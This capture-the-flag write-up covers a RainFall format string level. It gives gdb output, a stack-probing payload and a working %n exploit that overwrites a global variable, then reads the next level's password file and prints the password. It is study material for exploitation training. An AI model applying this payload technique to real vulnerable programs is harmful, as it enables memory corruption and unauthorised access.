# Level 3 - Format String Vulnerability

## Objective
Exploit printf format string to modify global variable `m` to 64.

## Analysis

### Finding the Global Variable
```bash
(gdb) info variables
0x0804988c  m

(gdb) x/x 0x0804988c
0x804988c <m>:  0x00000000
```

### Testing Format String
```bash
level3@RainFall:~$ python -c 'print "AAAA" + ".%x"*10' | ./level3
AAAA.200.b7fd1ac0.b7ff37d0.41414141.2e78252e.252e7825.78252e78...
```

**Key Finding:**
- 4th parameter shows `41414141` (our "AAAA")
- We can use `%n` to write to this address

## Exploitation

### Understanding %n
- `%n` writes the number of bytes printed so far to an address
- We need to print 64 bytes before using `%n`

### Crafting Payload
```python
# Address of m (little-endian)
addr = "\x8c\x98\x04\x08"

# Print 64 bytes total
# 4 bytes for address + 60 padding
payload = addr + "%60x" + "%4$n"

# Explanation:
# - addr: writes to this location
# - %60x: prints 60 characters (padded hex)
# - %4$n: writes count to 4th parameter (our address)
```

### Execution
```bash
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%60x" + "%4$n"' | ./level3
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

## Key Concepts
- Format string vulnerability
- Direct parameter access
- %n format specifier
- Memory write primitive
